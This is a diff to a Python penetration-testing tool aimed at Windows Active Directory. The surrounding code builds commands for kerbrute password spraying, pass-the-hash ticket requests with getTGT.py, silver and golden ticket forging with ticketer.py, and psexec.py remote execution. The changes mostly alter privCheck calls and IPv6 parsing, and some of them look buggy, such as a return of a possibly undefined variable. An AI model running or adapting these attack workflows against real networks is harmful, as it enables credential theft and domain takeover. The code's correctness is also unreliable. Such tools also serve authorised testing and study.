@@ -254,7 +254,7 @@ def privCheck():
          remotCOM(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
       else:
          print("[-] Unable to find a valid ticket...")
-      return
+      return spacePadding(ticket, COL1)
          
 def checkPorts(PTS, POR):
    checkParams = test_TIP()  
@@ -1268,9 +1268,9 @@ while True:
       else:
          checkParams = 0
          count = TIP.count(':')            
-         if count == 7:
+         if count == 6:
             try:
-               bit1,bit2,bit3,bit4,bit5,bit6,bit7,bit8 = TIP.split(":")
+               bit1,bit2,bit3,bit4,bit5,bit6,bit7 = TIP.split(":")
                print("[+] Defualting to internet protocol 6...")
                IP46 = "-6"
                checkParams = 1
@@ -1313,6 +1313,9 @@ while True:
          POR = spacePadding(POR, COL1)
       else:
          POR = BAK
+      squidCheck()
+      SKEW = timeSync(SKEW)
+      prompt()
          
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
@@ -2371,7 +2374,7 @@ while True:
             USR,PAS = test1.split(":")
             USR = spacePadding(USR, COL1)
             PAS = spacePadding(PAS, COL1)
-            TGT = privCheck(TGT)                         
+            TGT = privCheck()                         
          if found == 0:
             print(colored("\n[*] Now trying all usernames with matching passwords...",colour3))
             remotCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")
@@ -2381,7 +2384,7 @@ while True:
                USR,PAS = test2.split(":")
                USR = spacePadding(USR, COL1)
                PAS = spacePadding(PAS, COL1)
-               TGT = privCheck(TGT)                              
+               TGT = privCheck()                              
          if found == 0:
             print(colored("\n[*] Now trying all users against password list, please wait as this could take sometime...",colour3))            
             remotCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp")                 
@@ -2390,7 +2393,7 @@ while True:
                USR,PAS = test3.split(":") 
                USR = spacePadding(USR, COL1)
                PAS = spacePadding(PAS, COL1)
-               TGT = privCheck(TGT)               
+               TGT = privCheck()               
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2518,7 +2521,7 @@ while True:
                      checkFile = ticket.read()                                           
                   if "[*] Saving ticket" in checkFile:
                      print("[+] Ticket successfully generated for " + USR.rstrip(" ") + " using hash substitute " + str(USER[counter]).rstrip(" ") + ":" + brute + "...")                    
-                     TGT = privCheck(TGT)                         
+                     TGT = privCheck()                         
                      NTM = spacePadding(brute, COL1)
                      checkParams = 2
                      break                                                               
@@ -2555,7 +2558,7 @@ while True:
             remotCOM(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))                        
             if os.path.exists(USR.rstrip(" ") + ".ccache"):
                print("[+] Checking TGT status...")
-               TGT = privCheck(TGT)
+               TGT = privCheck()
          else:
             print("[+] TGT was not generated...")                              
       prompt()
@@ -2612,7 +2615,7 @@ while True:
             remotCOM(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))            
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             print("[+] Checking silver TGT status...")
-            TGT = privCheck(TGT)
+            TGT = privCheck()
          else:
              print("[+] Silver TGT was not generated...")                   
       prompt()
@@ -2640,7 +2643,7 @@ while True:
             remotCOM(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))                        
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             print("[+] Checking gold TGT status...")
-            TGT = privCheck(TGT)
+            TGT = privCheck()
          else:
             print("[+] Golden TGT was not generated...")            
       prompt()
